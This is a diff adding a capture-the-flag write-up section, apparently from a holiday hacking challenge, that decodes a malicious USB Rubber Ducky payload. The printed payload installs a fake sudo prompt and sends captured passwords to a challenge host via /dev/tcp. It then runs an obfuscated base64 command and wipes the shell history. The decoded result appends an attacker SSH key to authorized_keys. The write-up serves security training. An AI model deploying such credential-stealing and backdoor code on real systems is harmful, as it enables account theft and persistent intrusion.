@@ -123,3 +123,113 @@ Once complete, here's what Jewel has to say:
 > I heard that SSH keys can be used as backdoors. Maybe that's useful?
 
 ## The Main Challenge
+
+The USB device in question can be found by heading throug the doorway at the far left of the Santa Talks floor.  Accessing the terminal gives the following prompt:
+
+```bash
+A random USB device, oh what could be the matter?
+It seems a troll has left this, right on a silver platter.
+Oh my friend I need your ken, this does not smell of attar.
+Help solve this challenge quick quick, I shall offer no more natter.
+
+Evaluate the USB data in /mnt/USBDEVICE.
+
+
+elf@8cf4fe6a23da:~$
+```
+
+Listing the contents of our directory, we see we have access to `mallard.py` which seems to be a script to help with evaluating duckscript binaries:
+
+```bash
+elf@d1717fa474ab:~$ ls -l
+total 12
+-rwxr-xr-x 1 root root 8802 Nov 30 22:14 mallard.py*
+elf@d1717fa474ab:~$ ./mallard.py 
+usage: mallard.py [-h] [--file FILE] [--no_analyze] [--output_file OUTPUT_FILE]
+                  [--analysis_file ANALYSIS_FILE] [--debug]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --file FILE, -f FILE  The file to decode, default: inject.bin
+  --no_analyze, -A      Include this switch to turn off analysis of the duckyfile
+  --output_file OUTPUT_FILE, -o OUTPUT_FILE
+                        File to save decoded ducky script to. Default will print duckyfile to
+                        screen.
+  --analysis_file ANALYSIS_FILE
+                        Location to output analysis. Default will print analysis to screen.
+  --debug               Enable Debug Logging.
+ 
+```
+
+Let's run it against the `USBDEVICE`:
+
+```bash
+elf@d1717fa474ab:~$ ./mallard.py -f /mnt/USBDEVICE/inject.bin -o out                           
+ENTER                                                                                          
+DELAY 1000                                                                                     
+GUI SPACE                                                                                      
+DELAY 500                                                                                      
+STRING terminal                                                                                
+ENTER                                                                                          
+DELAY 500                                                                                      
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+STRING  /bin/bash
+ENTER
+DELAY 500
+STRING mkdir -p ~/.config/sudo
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash > ~/.config/sudo/sudo
+ENTER
+STRING /usr/bin/sudo $@ 
+ENTER
+STRING echo -n "[sudo] password for $USER: "
+ENTER
+STRING read -s pwd
+ENTER
+STRING echo                                                                                    
+ENTER                                                                                          
+STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null                                         
+ENTER                                                                                          
+STRING if [ $? -eq 1 ]                                                                         
+ENTER                                                                                          
+STRING then
+ENTER
+STRING echo "$USER:$pwd:invalid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "Sorry, try again."
+ENTER
+STRING sudo $@
+ENTER
+STRING else
+ENTER
+STRING echo "$USER:$pwd:valid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "$pwd" | /usr/bin/sudo -S $@
+ENTER
+STRING fi
+ENTER
+STRING fi' > ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
+ENTER
+DELAY 600
+STRING history -c && rm .bash_history && exit
+ENTER
+DELAY 600
+GUI q
+```
+
+We get what appears to be the original Ducky Script.  The script seems to be generating a fake sudo prompt, capturing the target users' sudo credentials, and sending them to a malicious site.  Towards to bottom, we see what looks like a reversed base64 encoded string that gets piped to `rev`, then `base64 -d` to decode, and finally `bash` to execute.  We can run this command in a bash terminal, minus the pipe to `bash`, to retrieve its contents:
+
+```
+$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d
+echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
+```
+
+The device adds a malicious ssh key to the authorized keys list for backdoor access to the victims system.  This key includes the answer to the challenge `ickymcgoop`. 
